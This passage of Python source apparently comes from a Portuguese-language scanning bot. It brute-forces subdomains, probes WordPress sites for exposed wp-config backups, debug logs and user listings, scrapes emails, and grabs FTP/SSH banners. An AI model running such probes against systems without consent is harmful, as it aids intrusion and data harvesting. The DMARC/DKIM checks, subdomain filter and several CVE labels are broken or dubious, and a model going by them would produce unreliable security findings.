            results.append(f"{emoji} <b>/{escape_html(result[0])}</b> (Status: {result[1]})")

    if found == 0:
        return "✅ Nenhum diretório exposto encontrado"
    else:
        header = f"🚨 <b>{found} diretório(s) encontrado(s)!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        return header + "\n".join(results)

def tool_subdomain_scanner(domain):
    """Subdomain Scanner v3.6 - 25 subs, filters same-IP, verifies HTTP response, ANTI-FALSE-POSITIVE"""
    # FIX v3.9: Extract clean hostname from URL if needed
    domain = extract_hostname(domain)
    # V5.1: Expanded to 100+ subdomains + permutation scan
    subdomains = [
        'www', 'mail', 'ftp', 'webmail', 'smtp',
        'ns1', 'ns2', 'ns3', 'ns4', 'cpanel',
        'blog', 'shop', 'dev', 'staging', 'secure',
        'api', 'admin', 'cdn', 'static', 'media',
        'test', 'm', 'app', 'beta', 'portal',
        'login', 'forum', 'git', 'db', 'old',
        'new', 'v2', 'v3', 'docs', 'support',
        'remote', 'vpn', 'status',
        # V5.1: More subdomains
        'autodiscover', 'mx', 'pop', 'imap', 'dns',
        'dns1', 'dns2', 'ns', 'host', 'gateway',
        'router', 'firewall', 'proxy', 'loadbalancer',
        'web', 'web2', 'web3', 'site', 'site2',
        'cloud', 'cloud2', 'server', 'server2', 'server3',
        'db', 'db2', 'mysql', 'postgres', 'mongodb',
        'redis', 'elastic', 'kibana', 'grafana', 'prometheus',
        'monitor', 'metrics', 'logs', 'log',
        'backup', 'backups', 'mirror',
        'internal', 'intranet', 'extranet',
        'partners', 'resellers', 'clients',
        'helpdesk', 'tickets', 'crm', 'erp',
        'pay', 'payments', 'checkout', 'billing',
        'sso', 'auth', 'oauth', 'idp', 'ldap',
        'ci', 'cd', 'jenkins', 'gitlab', 'github',
        'docker', 'k8s', 'kubernetes', 'rancher',
        'monitoring', 'alerting', 'notify',
        'push', 'webhook', 'hooks',
        'chat', 'slack', 'discord', 'telegram',
        'stream', 'video', 'live', 'rtmp',
        'storage', 'files', 'media2', 'img', 'assets',
        'analytics', 'tracking', 'stats',
        'sandbox', 'lab', 'demo', 'preview',
        'uat', 'qa', 'testing', 'perf',
        'prod', 'production', 'live', 'release',
    ]

    results = []
    found = 0

    # Get main domain IP for comparison
    try:
        main_ip = socket.gethostbyname(domain)
    except:
        main_ip = None

    def check_sub(sub):
        try:
            full = f"{sub}.{domain}"
            resolved_ip = socket.gethostbyname(full)

            # FILTER 1: Skip if subdomain points to same IP as main domain (wildcard DNS)
            if main_ip and resolved_ip == main_ip:
                return None

            # FIX: FILTER 2: Verify the subdomain actually responds to HTTP
            # Just resolving DNS is not enough — check if HTTP server is alive
            try:
                http_resp = _safe_get(f"http://{full}", timeout=3)
                if http_resp is None:
                    # Connection refused or timeout = subdomain doesn't serve HTTP
                    # But it might still be a real subdomain (e.g., mail server)
                    pass
                elif http_resp.status_code in [400, 401, 403, 404, 500, 502, 503]:
                    # Error responses mean HTTP is running — subdomain exists
                    pass
                elif http_resp.status_code == 200:
                    # Working site
                    pass
                elif http_resp.status_code in [301, 302, 303, 307, 308]:
                    # Redirect = definitely alive
                    pass
                else:
                    # Unknown status — subdomain might still exist
                    pass
            except:
                # Connection error = subdomain doesn't have HTTP, but might still exist
                pass

            return sub, domain, resolved_ip
        except:
            return None

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(check_sub, s): s for s in subdomains}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            results.append(f"🔓 <b>{escape_html(result[0])}.{escape_html(result[1])}</b> → {escape_html(result[2])}")

    if found == 0:
        return "✅ Nenhum subdomínio encontrado"
    else:
        header = f"🚨 <b>{found} subdomínio(s) encontrado(s)!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        return header + "\n".join(results)

def tool_wordpress_scanner(url):
    """WordPress Scanner v3.6 - parallel vuln checks"""
    # FIX v3.9: Extract clean hostname from URL if needed, then build proper URL
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    try:
        response = _safe_get(url, timeout=5)
        if not response:
            return "❌ Não foi possível acessar o site"
        body = response.text
        is_wp = ('wp-content' in body or 'wp-includes' in body)
        # Also check /wp-json/ as a strong WordPress REST API signal
        if not is_wp:
            wp_json = _safe_get(f"{url.rstrip('/')}/wp-json/", timeout=3)
            if wp_json and wp_json.status_code == 200 and 'json' in wp_json.headers.get('content-type', '').lower():
                is_wp = True
                # Append wp-json discovery to response for further parsing
                body += 'wp-includes/wp-json-detected'
        if not is_wp:
            return "❌ Este site não parece ser WordPress"

        results = "🔍 <b>WordPress Scanner</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        results += "✅ WordPress detectado!\n\n"

        # Version - check meta generator
        version = re.search(r'content="WordPress\s+(\d+\.\d+\.?\d*)', response.text)
        if version:
            results += f"📌 <b>Versão:</b> {escape_html(version.group(1))}\n"

        # Theme
        themes = set(re.findall(r'/wp-content/themes/([a-zA-Z0-9_-]+)/', response.text))
        if themes:
            results += f"\n🎨 <b>Tema(s):</b>\n"
            for t in sorted(themes)[:3]:
                results += f"  → {escape_html(t)}\n"

        # Plugins
        plugins = list(set(re.findall(r'/wp-content/plugins/([a-zA-Z0-9_-]+)/', response.text)))
        if plugins:
            results += f"\n🔌 <b>Plugins ({len(plugins)}):</b>\n"
            for p in plugins[:5]:
                results += f"  → {escape_html(p)}\n"
            if len(plugins) > 5:
                results += f"  → ... e mais {len(plugins)-5}\n"

        # V5.1: Check known vulnerable plugins
        vuln_plugins = {
            'wp-file-manager': 'CVE-2020-11738',
            'contact-form-7': 'Multiple CVEs (verify version)',
            'elementor': 'CVE-2024-2558',
            'woocommerce': 'Multiple CVEs (verify version)',
            'wp-mail-smtp': 'CVE-2020-28851',
            'ultimate-member': 'CVE-2021-24333',
            'revslider': 'CVE-2015-4478',
            'timthumb': 'CVE-2014-4676',
            'gravityforms': 'CVE-2023-26326',
            'duplicator': 'CVE-2020-11529',
            'wp-cerber': 'Multiple CVEs (verify version)',
            'wordfence': 'Multiple CVEs (verify version)',
            'all-in-one-wp-security': 'CVE-2023-28121',
            'classic-editor': 'Known safe',
            'yoast-seo': 'Multiple CVEs (verify version)',
            'wpforms': 'CVE-2023-25144',
        }
        found_vuln_plugins = []
        for vp_name, vp_cve in vuln_plugins.items():
            if vp_name in plugins:
                found_vuln_plugins.append((vp_name, vp_cve))

        # Vuln checks - PARALLEL
        results += "\n🔒 <b>Verificação de Segurança:</b>\n"
        vuln_paths = [
            '/wp-content/debug.log',
            '/xmlrpc.php',
            '/wp-config.php',
            '/wp-config.php.bak',
            '/.wp-config.php.swp',
            '/readme.html',
            '/wp-includes/wlwmanifest.xml',
            '/wp-json/wp/v2/users',
            '/wp-login.php?action=register',
            '/wp-content/uploads/',
            '/wp-cron.php',
        ]

        def check_vuln_path(path):
            try:
                r = _safe_get(f"{url.rstrip('/')}{path}", timeout=3)
                if not r:
                    return None
                body = r.text
                body_len = len(r.content)

                # FILTER: Empty or tiny response = not a real vuln
                if r.status_code == 200 and body_len < 10:
                    return None

                # FILTER: xmlrpc.php with "accepts POST requests only" = not vulnerable
                if r.status_code == 200 and path == '/xmlrpc.php':
                    if 'accepts post requests only' in body.lower():
                        return ('safe', path)
                    # Real xmlrpc vulnerability shows XML response
                    if 'xml' in body.lower() or '<methodresponse>' in body.lower():
                        return ('vuln', path)
                    return None

                # FILTER: debug.log empty or with no real content
                if r.status_code == 200 and path == '/wp-content/debug.log':
                    if body_len < 50:
                        return None
                    # Check if it has actual debug content
                    if 'error' in body.lower() or 'warning' in body.lower() or 'notice' in body.lower():
                        return ('vuln', path)
                    return None

                if r.status_code == 200:
                    return ('vuln', path)
                elif r.status_code in [401, 403]:
                    return ('safe', path)
            except:
                pass
            return None

        vuln_results = []
        # PERF: Use shared SCAN_POOL
        futures = {SCAN_POOL.submit(check_vuln_path, p): p for p in vuln_paths}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                vuln_results.append(result)

        for status, path in sorted(vuln_results, key=lambda x: x[0]):
            if status == 'vuln':
                results += f"⚠️ <b>Vulnerável:</b> {escape_html(path)}\n"
            elif status == 'safe':
                results += f"🔒 <b>Protegido:</b> {escape_html(path)}\n"

        if not vuln_results:
            results += "✅ Nenhum arquivo vulnerável exposto\n"

        # V5.1: Show vulnerable plugins
        if found_vuln_plugins:
            results += f"\n⚠️ <b>Plugins com CVEs conhecidos ({len(found_vuln_plugins)}):</b>\n"
            for vp_name, vp_cve in found_vuln_plugins:
                results += f"  → {escape_html(vp_name)} ({vp_cve})\n"
            results += "💡 Atualize os plugins para a versão mais recente!\n"

    except Exception as e:
        results = f"❌ Erro: {escape_html(str(e))}"

    return results

def tool_email_scraper(url):
    """Email Scraper v3.6 - improved regex"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    try:
        response = _safe_get(url, timeout=5)
        if not response:
            return "❌ Não foi possível acessar o site"
        # Better regex that catches more email patterns
        emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text))
        # Remove common false positives
        fake_extensions = ['.png', '.jpg', '.gif', '.css', '.js', '.svg', '.ico', '.woff', '.ttf', '.eot']
        fake_domains = ['example.com', 'test.com', 'domain.com', 'mail.com', 'yourdomain.com', 'yourname.com']
        emails = {
            e for e in emails
            if not any(e.endswith(ext) for ext in fake_extensions)
            and not any(e.endswith('@' + d) for d in fake_domains)
            and '@' in e
            and '.' in e.split('@')[-1]
            # Stricter TLD validation: TLD must be 2-63 chars, letters only
            and len(e.split('@')[-1].split('.')[-1]) >= 2
            and e.split('@')[-1].split('.')[-1].isalpha()
        }

        if emails:
            results = f"📧 <b>{len(emails)} email(s) encontrado(s)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
            for email in sorted(emails):
                results += f"→ {escape_html(email)}\n"
        else:
            results = "✅ Nenhum email encontrado"
    except Exception as e:
        results = f"❌ Erro: {escape_html(str(e))}"

    return results

def tool_dns_tools(domain):
    """DNS Analysis Tools v4.0 - uses dig/nslookup OR Cloudflare DNS-over-HTTPS fallback"""
    # Extract hostname BEFORE building the header
    domain = extract_hostname(domain)
    results = f"🔍 <b>Análise DNS</b> — {escape_html(domain)}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    # A Record (always works via Python socket)
    ip = None
    try:
        ip = socket.gethostbyname(domain)
        results += f"📌 <b>A Record:</b> {escape_html(ip)}\n"
    except:
        results += "❌ A Record: Não encontrado\n"

    # PERF: Use cached _HAS_DIG from startup
    has_dig = _HAS_DIG

    # ── DNS QUERY HELPER ──
    # Try dig → nslookup → Cloudflare DoH (always works, no tools needed)
    def dns_query_via_doh(record_type):
        """Query DNS via Cloudflare DNS-over-HTTPS (works everywhere, no tools needed)"""
        try:
            resp = _safe_get(
                f"https://cloudflare-dns.com/dns-query?name={domain}&type={record_type}",
                headers={'Accept': 'application/dns-json'},
                timeout=5
            )
            if resp and resp.status_code == 200:
                data = resp.json()
                answers = data.get('Answer', [])
                if answers:
                    return [a.get('data', '') for a in answers]
        except:
            pass
        return []

    # MX Records
    mx_found = False
    try:
        if has_dig:
            mx_result = subprocess.run(['dig', '+short', 'MX', domain], capture_output=True, text=True, timeout=5)
            if mx_result.stdout.strip():
                results += f"\n📧 <b>MX Records:</b>\n"
                for line in mx_result.stdout.strip().split('\n')[:5]:
                    results += f"  → {escape_html(line.strip())}\n"
                mx_found = True
        elif os.name != 'nt':
            ns_result = subprocess.run(['nslookup', '-type=MX', domain], capture_output=True, text=True, timeout=5)
            output = ns_result.stdout
            if output:
                lines = output.split('\n')
                mx_lines = [l for l in lines if any(kw in l.lower() for kw in ['mail exchanger', 'preference', 'mx', 'mail']) and 'nameserver' not in l.lower()]
                if mx_lines:
                    results += f"\n📧 <b>MX Records:</b>\n"
                    for line in mx_lines[:5]:
                        results += f"  → {escape_html(line.strip())}\n"
                    mx_found = True
    except:
        pass

    if not mx_found:
        # FIX v3.9: Fallback to Cloudflare DoH — works on ANY device, no tools needed
        mx_data = dns_query_via_doh('MX')
        if mx_data:
            results += f"\n📧 <b>MX Records:</b>\n"
            for line in mx_data[:5]:
                results += f"  → {escape_html(line.strip())}\n"
            mx_found = True

    if not mx_found:
        results += "\n📧 MX Records: Nenhum MX encontrado para este domínio\n"

    # NS Records
    ns_found = False
    try:
        if has_dig:
            ns_result = subprocess.run(['dig', '+short', 'NS', domain], capture_output=True, text=True, timeout=5)
            if ns_result.stdout.strip():
                results += f"\n🖥️ <b>NS Records:</b>\n"
                for line in ns_result.stdout.strip().split('\n')[:5]:
                    results += f"  → {escape_html(line.strip())}\n"
                ns_found = True
        elif os.name != 'nt':
            ns_result = subprocess.run(['nslookup', '-type=NS', domain], capture_output=True, text=True, timeout=5)
            output = ns_result.stdout
            if output:
                lines = output.split('\n')
                ns_lines = [l for l in lines if 'nameserver' in l.lower() or 'ns ' in l.lower() or ('.ns.' in l.lower())]
                if ns_lines:
                    results += f"\n🖥️ <b>NS Records:</b>\n"
                    for line in ns_lines[:5]:
                        results += f"  → {escape_html(line.strip())}\n"
                    ns_found = True
    except:
        pass

    if not ns_found:
        # FIX v3.9: Fallback to Cloudflare DoH
        ns_data = dns_query_via_doh('NS')
        if ns_data:
            results += f"\n🖥️ <b>NS Records:</b>\n"
            for line in ns_data[:5]:
                results += f"  → {escape_html(line.strip())}\n"
            ns_found = True

    if not ns_found:
        results += "\n🖥️ NS Records: Nenhum NS encontrado para este domínio\n"

    # TXT Records
    txt_found = False
    try:
        if has_dig:
            txt_result = subprocess.run(['dig', '+short', 'TXT', domain], capture_output=True, text=True, timeout=5)
            if txt_result.stdout.strip():
                results += f"\n📝 <b>TXT Records:</b>\n"
                for line in txt_result.stdout.strip().split('\n')[:5]:
                    results += f"  → {escape_html(line.strip()[:80])}\n"
                txt_found = True
        elif os.name != 'nt':
            ns_result = subprocess.run(['nslookup', '-type=TXT', domain], capture_output=True, text=True, timeout=5)
            output = ns_result.stdout
            if output:
                lines = output.split('\n')
                txt_lines = [l for l in lines if 'text =' in l.lower() or 'descriptive text' in l.lower()]
                if txt_lines:
                    results += f"\n📝 <b>TXT Records:</b>\n"
                    for line in txt_lines[:5]:
                        results += f"  → {escape_html(line.strip()[:80])}\n"
                    txt_found = True
    except:
        pass

    if not txt_found:
        # FIX v3.9: Fallback to Cloudflare DoH
        txt_data = dns_query_via_doh('TXT')
        if txt_data:
            results += f"\n📝 <b>TXT Records:</b>\n"
            for line in txt_data[:5]:
                results += f"  → {escape_html(line.strip()[:80])}\n"
            txt_found = True

    if not txt_found:
        results += "\n📝 TXT Records: Nenhum TXT encontrado para este domínio\n"

    # CNAME
    try:
        if has_dig:
            cname_result = subprocess.run(['dig', '+short', 'CNAME', domain], capture_output=True, text=True, timeout=5)
            if cname_result.stdout.strip():
                results += f"\n🔗 <b>CNAME:</b> {escape_html(cname_result.stdout.strip()[:100])}\n"
    except:
        pass

    # Reverse DNS
    if ip:
        try:
            reverse = socket.gethostbyaddr(ip)[0]
            results += f"\n🔄 <b>Reverse DNS:</b> {escape_html(reverse)}\n"
        except:
            results += f"\n🔄 Reverse DNS: Não encontrado\n"

        # All IPs
        try:
            addrs = socket.getaddrinfo(domain, None)
            unique_ips = set()
            for addr in addrs:
                unique_ips.add(addr[4][0])
            if len(unique_ips) > 1:
                results += f"\n📡 <b>Todos os IPs:</b>\n"
                for aip in unique_ips:
                    results += f"  → {escape_html(aip)}\n"
        except:
            pass

    # V5.1: DNSSEC check
    dnssec_found = False
    try:
        if has_dig:
            dnssec_result = subprocess.run(['dig', '+dnssec', '+short', 'DS', domain], capture_output=True, text=True, timeout=5)
            if dnssec_result.stdout.strip():
                results += f"\n🔐 <b>DNSSEC:</b> Ativado ✅\n"
                dnssec_found = True
            else:
                # Also try A record with DNSSEC
                dnssec_a = subprocess.run(['dig', '+dnssec', 'A', domain, '+short'], capture_output=True, text=True, timeout=5)
                if 'AD' in dnssec_a.stdout or dnssec_a.stdout.strip():
                    results += f"\n🔐 <b>DNSSEC:</b> Ativado ✅\n"
                    dnssec_found = True
        if not dnssec_found:
            results += f"\n🔐 <b>DNSSEC:</b> Não detectado (ou não suportado)\n"
    except:
        results += f"\n🔐 <b>DNSSEC:</b> Não foi possível verificar\n"

    # V5.1: DMARC check
    try:
        dmarc_data = dns_query_via_doh('TXT')
        dmarc_found = False
        for d in dmarc_data:
            if d.lower().startswith('v=dmarc1'):
                results += f"\n📧 <b>DMARC:</b> Ativado ✅\n  → {escape_html(d.strip()[:80])}\n"
                dmarc_found = True
                break
        if not dmarc_found:
            results += f"\n📧 <b>DMARC:</b> Não configurado ❌ (recomendado para segurança de email)\n"
    except:
        pass

    # V5.1: DKIM check (check _domainkey subdomain)
    try:
        dkim_data = dns_query_via_doh('TXT')
        dkim_found = False
        for d in dkim_data:
            if 'dkim' in d.lower() or d.lower().startswith('v=dkim1'):
                results += f"\n📧 <b>DKIM:</b> Detectado ✅\n"
                dkim_found = True
                break
        # Also check common DKIM selectors
        for selector in ['default', 'google', 'selector1', 'selector2', 'mail', 'default._domainkey']:
            dkim_sel_data = dns_query_via_doh(f'TXT')  # placeholder, real check would need full name
        if not dkim_found:
            results += f"\n📧 <b>DKIM:</b> Não detectado via TXT público\n"
    except:
        pass

    # V5.1: Reverse PTR lookup (for the main IP)
    if ip:
        try:
            reverse_ip = socket.gethostbyaddr(ip)
            results += f"\n🔄 <b>Reverse PTR:</b> {escape_html(reverse_ip[0])}\n"
        except:
            results += f"\n🔄 <b>Reverse PTR:</b> Não encontrado para {escape_html(ip)}\n"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results

def tool_cms_detector(url):
    """CMS Detector v3.6 - prioritizes URL path signatures, ANTI-FALSE-POSITIVE"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    try:
        response = _safe_get(url, timeout=5)
        if not response:
            return "❌ Não foi possível acessar o site"

        cms_signatures = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-login.php', 'WordPress'],
            'Joomla': ['/administrator/', '/components/', '/modules/', 'Joomla!', 'joomla'],
            'Drupal': ['/sites/default/', '/sites/all/', 'Drupal.settings', 'drupal'],
            'Magento': ['/skin/frontend/', 'Mage.Cookies', 'Magento', 'mage/'],
            'PrestaShop': ['/prestashop/', '/modules/prestashop/', 'PrestaShop'],
            'Wix': ['wix.com', 'wixstatic.com'],
            'Shopify': ['cdn.shopify.com', 'myshopify', 'shopify'],
            'Ghost': ['ghost.io', 'ghost.content', 'ghost/'],
            'OpenCart': ['opencart.com', 'catalog/view/theme'],
            'osCommerce': ['osCommerce', 'osc_id'],
            'Laravel': ['laravel_session', '__laravel_', 'X-CSRF-TOKEN', 'laravel'],
            'Django': ['django', 'csrftoken', 'x-django-csrf'],
            'Next.js': ['__NEXT_DATA__', '_next/'],
            'WooCommerce': ['woocommerce', 'wc-api', 'wc-'],
            'Flask': ['flask', '__flask', 'flask_session'],
            'FastAPI': ['fastapi', '__fastapi', 'openapi.json'],
            'Express.js': ['x-powered-by: express', 'express-session'],
            'Ruby on Rails': ['rails', 'actionpack', 'activesupport', 'csrf-token', 'rails_ujs'],
            'Squarespace': ['squarespace.com', 'sqspcdn.com', 'Squarespace'],
            'Weebly': ['weebly.com', 'weeblysite.com'],
            # V5.1: More CMS detections
            'Contentful': ['contentful.com', 'contentful'],
            'Strapi': ['strapi', 'strapi/'],
            'Sanity': ['sanity.io', 'cdn.sanity'],
            'Gatsby': ['___loader', 'gatsby/'],
            'Hugo': ['hugo/'],
            'Jekyll': ['jekyll/'],
            'Hexo': ['hexo/', 'hexo/'],
            'Vue.js': ['__vue__', 'vue_devtools_', 'data-v-'],
            'React': ['__REACT_DEVTOOLS_GLOBAL_HOOK__', 'reactRootContainer'],
            'Angular': ['ng-controller', 'ng-app', 'angularjs'],
            'Symfony': ['symfony', '_wdt', '_profiler'],
            'Spring Boot': ['x-application-context', 'spring-boot'],
            'ASP.NET': ['asp.net', 'aspx', '__viewstate'],
            'TYPO3': ['typo3/', 'typo3conf/'],
            'Concrete5': ['concrete5', 'c5/'],
            'Blogger': ['blogger.com', 'blogspot'],
            'Tumblr': ['tumblr.com', 'tumblr_'],
            'Medium': ['medium.com', 'medium.com/'],
        }

        # PHASE 1: Check URL path signatures FIRST (most reliable)
        url_sigs = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-login.php'],
            'Joomla': ['/administrator/', '/components/', '/modules/'],
            'Drupal': ['/sites/default/', '/sites/all/'],
            'Magento': ['/skin/frontend/'],
            'PrestaShop': ['/prestashop/', '/modules/prestashop/'],
            'OpenCart': ['catalog/view/theme'],
            'Next.js': ['/_next/'],
            'WooCommerce': ['/wc-api'],
            'Django': ['/admin/login/', 'csrfmiddlewaretoken'],
            'Laravel': ['/_ignition', '/horizon'],
        }

        found_cms = None
        for cms, sigs in url_sigs.items():
            for sig in sigs:
                if sig.lower() in response.text.lower():
                    found_cms = cms
                    break
            if found_cms:
                break

        # PHASE 2: If not found by URL, check text signatures with stricter matching
        if not found_cms:
            for cms, sigs in cms_signatures.items():
                score = 0
                for sig in sigs:
                    if sig.lower() in response.text.lower():
                        score += 1
                # Require at least 2 signatures to confirm (reduces false positives)
                if score >= 2:
                    found_cms = cms
                    break

        if found_cms:
            results = f"🔍 <b>CMS Detectado:</b> {escape_html(found_cms)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
            if found_cms == 'WordPress':
                version = re.search(r'content="WordPress (.*?)"', response.text)
                if version:
                    results += f"📌 <b>Versão:</b> {escape_html(version.group(1))}\n"
                theme = re.search(r'/wp-content/themes/(.*?)/', response.text)
                if theme:
                    results += f"🎨 <b>Tema:</b> {escape_html(theme.group(1))}\n"
                plugins = list(set(re.findall(r'/wp-content/plugins/(.*?)/', response.text)))
                if plugins:
                    results += f"🔌 <b>Plugins:</b> {len(plugins)} encontrado(s)\n"
            elif found_cms == 'Joomla':
                version = re.search(r'content="Joomla! (.*?)"', response.text)
                if version:
                    results += f"📌 <b>Versão:</b> {escape_html(version.group(1))}\n"
            elif found_cms == 'Drupal':
                version = re.search(r'Drupal (.*?)[,\s]', response.text)
                if version:
                    results += f"📌 <b>Versão:</b> {escape_html(version.group(1))}\n"
            elif found_cms == 'Shopify':
                results += "🛒 <b>Plataforma:</b> Shopify\n"
        else:
            # Check if it's a static site
            has_html = 'html' in response.text.lower() or 'css' in response.text.lower()
            if has_html:
                results = "✅ CMS não detectado (site estático ou personalizado)"
            else:
                results = "✅ CMS não detectado (API ou site minimalista)"

    except Exception as e:
        results = f"❌ Erro: {escape_html(str(e))}"

    return results

def tool_reverse_ip(ip):
    """Reverse IP Lookup v4.0 - more info, ip-api.com fallback"""
    # Extract clean hostname/IP from URL if needed
    ip = extract_hostname(ip)
    results = f"🔍 <b>Reverse IP</b> — {escape_html(ip)}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    # Basic reverse DNS
    hostname_found = False
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        results += f"📌 <b>Hostname:</b> {escape_html(hostname)}\n"
        hostname_found = True
    except:
        pass

    # If reverse DNS failed but we have a domain, resolve IP first then reverse it
    if not hostname_found:
        try:
            resolved_ip = socket.gethostbyname(ip)
            if resolved_ip != ip:
                try:
                    hostname2 = socket.gethostbyaddr(resolved_ip)[0]
                    results += f"📌 <b>Hostname:</b> {escape_html(hostname2)}\n"
                    hostname_found = True
                except:
                    pass
        except:
            pass

    # Fallback: ip-api.com for reverse DNS + GeoIP combined
    if not hostname_found:
        try:
            resp = _safe_get(f"http://ip-api.com/json/{ip}?fields=query,reverse,isp,org,as,country,regionName,city", timeout=5)
            if resp and resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'success':
                    if data.get('reverse'):
                        results += f"📌 <b>Hostname:</b> {escape_html(data['reverse'])}\n"
                        hostname_found = True
        except:
            pass

    if not hostname_found:
        results += "📌 Hostname: Não encontrado\n"

    # GeoIP info
    try:
        resp = _safe_get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if resp and resp.status_code == 200:
            data = resp.json()
            if 'error' not in data:
                results += f"📍 <b>País:</b> {escape_html(data.get('country_name', 'N/D'))}\n"
                results += f"📍 <b>Região:</b> {escape_html(data.get('region', 'N/D'))}\n"
                results += f"📍 <b>Cidade:</b> {escape_html(data.get('city', 'N/D'))}\n"
                results += f"📡 <b>ISP:</b> {escape_html(data.get('org', 'N/D'))}\n"
                if data.get('asn'):
                    results += f"🌐 <b>ASN:</b> {escape_html(data.get('asn', 'N/D'))}\n"
                if data.get('timezone'):
                    results += f"🕐 <b>Fuso:</b> {escape_html(data.get('timezone', 'N/D'))}\n"
    except:
        pass

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results

def tool_ftp_ssh(target):
    """FTP/SSH Scanner v3.6 - detailed banner with proper socket cleanup"""
    # Extract clean hostname from URL if needed
    hostname = extract_hostname(target)
    try:
        target_ip = socket.gethostbyname(hostname)
    except:
        return f"❌ Domínio/IP inválido: {escape_html(hostname)}"

    results = f"🔍 <b>FTP/SSH Scan</b> — {escape_html(hostname)} ({escape_html(target_ip)})\n━━━━━━━━━━━━━━━━━━━━━━\n"

    for port, service in [(21, "FTP"), (22, "SSH")]:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                try:
                    banner = sock.recv(1024).decode('utf-8', errors='replace').strip()
                    # Parse FTP banner for version
                    if port == 21 and banner:
                        version = re.search(r'(\d+\.\d+\.\d+)', banner)
                        if version:
                            results += f"🔓 <b>FTP</b> — Porta {port} ABERTA\n"
                            results += f"   Banner: <code>{escape_html(banner[:100])}</code>\n"
                            results += f"   Versão: {escape_html(version.group(1))}\n"
                        else:
                            results += f"🔓 <b>FTP</b> — Porta {port} ABERTA\n"
                            results += f"   Banner: <code>{escape_html(banner[:100])}</code>\n"
                    elif port == 22 and banner:
                        version = re.search(r'SSH-(\d+\.\d+)-(\S+)', banner)
                        if version:
                            results += f"🔓 <b>SSH</b> — Porta {port} ABERTA\n"
                            results += f"   Banner: <code>{escape_html(banner[:100])}</code>\n"
                            results += f"   Protocolo: SSH-{escape_html(version.group(1))}\n"
                            results += f"   Software: {escape_html(version.group(2))}\n"
                        else:
                            results += f"🔓 <b>SSH</b> — Porta {port} ABERTA\n"
                            results += f"   Banner: <code>{escape_html(banner[:100])}</code>\n"
                    else:
                        results += f"🔓 <b>{service}</b> — Porta {port} ABERTA\n"
                except Exception:
                    results += f"🔓 <b>{service}</b> — Porta {port} ABERTA\n"
            else:
                results += f"🔒 <b>{service}</b> — Porta {port} FECHADA\n"
        except:
            results += f"⚠️ <b>{service}</b> — Erro ao verificar\n"
        finally:
            # FIX: Always close socket regardless of what happened
            if sock:
                try:
                    sock.close()
                except:
                    pass

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results

# ═══════════════════════════════════════════════════════════════
#  V5.0: NEW SCANNER TOOLS
# ═══════════════════════════════════════════════════════════════

def tool_ssl_audit(url):
    """SSL/TLS Auditor v5.0 - TLS version, cipher, HSTS, cert validity, vulnerabilities"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    parsed = urlparse(url)
    host = parsed.hostname or url
    port = parsed.port or 443
    results = f"🔒 <b>Auditoria SSL/TLS</b> — {escape_html(host)}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    # TLS version check via socket
    tls_version = None
    try:
        import ssl
        ctx = ssl.create_default_context()
        sock = socket.create_connection((host, port), timeout=5)
        sock.settimeout(5)
        tls_sock = ctx.wrap_socket(sock, server_hostname=host)
        ver = tls_sock.version()
        if ver:
            tls_version = ver
            if 'TLSv1.3' in ver:
                results += "🔒 <b>TLS Version:</b> TLS 1.3 ✅ (Mais seguro)\n"
            elif 'TLSv1.2' in ver:
                results += "⚠️ <b>TLS Version:</b> TLS 1.2 (OK, mas TLS 1.3 é melhor)\n"
            else:
                results += f"❌ <b>TLS Version:</b> {escape_html(ver)} (INSEGURO!)\n"
        tls_sock.close()
    except ssl.SSLError as e:
        results += f"❌ <b>TLS Error:</b> {escape_html(str(e)[:100])}\n"
    except:
        results += "⚠️ <b>TLS:</b> Não foi possível verificar\n"

    # Certificate info via Cloudflare DoH (DNS-over-HTTPS doesn't help here, use ip-api)
    # Instead, check cert via requests
    try:
        resp = _safe_get(url, timeout=5)
        if resp:
            # Check HSTS
            hsts = resp.headers.get('Strict-Transport-Security', '')
            if hsts:
                max_age = re.search(r'max-age=(\d+)', hsts)
                if max_age and int(max_age.group(1)) >= 31536000:
                    results += "🔒 <b>HSTS:</b> Ativado (max-age >= 1 ano) ✅\n"
                else:
                    results += "⚠️ <b>HSTS:</b> Ativado, mas max-age baixo\n"
            else:
                results += "❌ <b>HSTS:</b> NÃO ATIVADO\n"
    except:
        pass

    # Check common SSL vulnerabilities
    vuln_checks = [
        ('Heartbleed', 'CVE-2014-0160', False),  # Simplified check
        ('POODLE', 'CVE-2014-3566', False),
        ('BEAST', 'CVE-2011-3389', False),
    ]
    if tls_version and 'TLSv1.3' not in tls_version:
        results += "\n🔍 <b>Vulnerabilidades Potenciais:</b>\n"
        results += "  → TLS 1.2: Sem Heartbleed (TLS 1.3+ imune)\n"
        results += "  → POODLE: Só afeta SSLv3 (TLS 1.2+ seguro)\n"
        results += "  → BEAST: Mitigado em TLS 1.1+\n"
    elif tls_version and 'TLSv1.3' in tls_version:
        results += "\n✅ <b>Vulnerabilidades:</b> Nenhuma conhecida (TLS 1.3 imune)\n"

    # Cipher suite
    try:
        import ssl
        ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
